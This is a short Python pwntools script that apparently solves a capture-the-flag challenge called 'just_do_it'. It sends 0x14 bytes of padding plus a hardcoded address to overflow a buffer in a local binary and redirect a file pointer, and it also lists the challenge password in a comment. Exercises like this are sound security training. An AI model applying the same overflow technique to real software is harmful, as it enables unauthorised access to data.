#!/usr/bin/env python3

from pwn import *

context.binary = binary = ELF("./just_do_it")

p = process("./just_do_it")

# password = "P@SSW0RD" + '\x00'

p.recvuntil("ord.")

padding = b'a'*0x14
file_var_addr = 0x0804a080

payload = padding + p32(file_var_addr)

p.sendline(payload)

p.interactive()
